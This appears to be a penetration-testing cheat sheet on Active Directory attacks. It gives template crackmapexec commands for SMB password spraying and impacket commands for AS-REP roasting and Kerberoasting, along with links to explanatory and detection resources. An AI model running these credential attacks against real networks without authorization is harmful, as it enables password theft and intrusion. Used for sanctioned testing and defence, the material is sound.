## Miscellaneous Attacks In No Particular Order

**SMB Password Spraying**

When You have a working password and a list of userames, or a working username and a list of passwords, ``crackmapexec`` makes testing your credentials trivial.

```bash
crackmapexec smb <IP> -u <USERLIST> -p '<PASS>' --continue-on-success
crackmapexec smb <IP> -u '<USER>' -p <PASSLIST> --continue-on-success
# Authenticate with an NT hash
crackmapexec smb <IP> -u '<USER>'-H '<NT_HASH>' --continue-on-success 
```

**AS-REP Roasting**

AS-REP roasting is a technique that allows retrieving password hashes for users that have don't require Kerberos preauthentication. ``impacket`` has a utility that makes this trivial for us. I could only do a bad job explaining this attack, so I've linked much better resources below. It is important to note that this is not found often, if at all, in real world engagements.

```bash
python3 GetNPUsers.py <DOMAIN>/ -dc-ip <IP> -no-pass -usersfile <USERLIST>
```

- [Roasting AS-REPS](https://www.harmj0y.net/blog/activedirectory/roasting-as-reps/)
- [AS-REP Roasting](https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/as-rep-roasting-using-rubeus-and-hashcat)

**Kerberoasting**

Kerberoasting is a method for extracting service account credentials from Active Directory as a notmal user. Again, [AD Security](https://adsecurity.org/) has an insane amount of content that goes in depth to what this is, how it works, and when to use it. I won't even bother going into the detail's of the attack here, but articles from them are linked below.

``impacket`` has a utility that makes this trivial for us, ``GetUserSPNs.py``.


```bash
# Normal Authentication
python3 GetUserSPNs.py -request -dc-ip <IP> <DOMAIN>/<USER>:<PASS> -save -outputfile hashes.txt

# Authentication with NT and LM Hashes
python3 GetUserSPNs.py -request -dc-ip <IP> -hashes <LM_HASH>:<NT_HASH> <DOMAIN>/<USER> -save -outputfile hashes.txt
```

If the DC is configured with UserAccountControl setting “Do not require Kerberos preauthentication” enabled, it's possible to request and receive a ticket to crack without a valid account on the domain. TL;DR You don't need a passsword.

```bash
python3 GetUserSPNs.py -request -dc-ip <IP> <DOMAIN>/<USER> -save -outputfile hashes.txt
```

- [Cracking Kerberos TGS Tickets Using Kerberoast](https://adsecurity.org/?p=2293)
- [Dectecting Kerboasting Activity](https://adsecurity.org/?p=3458)
- [Kerberos Overview](https://adsecurity.org/?p=227)
